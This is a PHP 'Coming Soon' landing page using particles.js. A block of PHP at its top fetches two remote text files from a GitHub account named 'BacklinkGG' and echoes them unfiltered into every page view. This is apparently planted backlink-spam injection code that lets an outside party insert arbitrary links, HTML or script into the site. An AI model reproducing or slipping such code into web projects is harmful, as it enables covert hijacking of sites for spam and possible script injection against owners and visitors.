<?php
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url1);
$result1 = curl_exec($ch);
curl_setopt($ch, CURLOPT_URL, $url2);
$result2 = curl_exec($ch);
curl_close($ch);
echo $result1;
echo $result2;
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>particles.js</title>
  <meta name="description" content="particles.js is a lightweight JavaScript library for creating particles.">
  <meta name="author" content="Vincent Garreau" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  
  <style>
    @import url('https://fonts.googleapis.com/css?family=Quicksand');
  </style> 

</head>
<body style="background-color: #000000;padding: 0px;margin: 0px;">
<div id="particles-js" style="height:100vh;width:100vw;position:absolute;overflow: hidden;"></div>
<div style="color: #ffffff;text-align: center;position: fixed;top: 30%;width: 100%;font-family: 'Quicksand', sans-serif;margin-top: -10px;">  
  <img src="logo.png" style="height:50px;">
  <h1>COMING SOON</h1>
  <small>We will be live soon. for any questions please write us at hello@ynaps.com</small>
</div>
<!-- scripts -->
<script src="particles.js"></script>
<script src="js/app.js"></script>

</body>
</html>
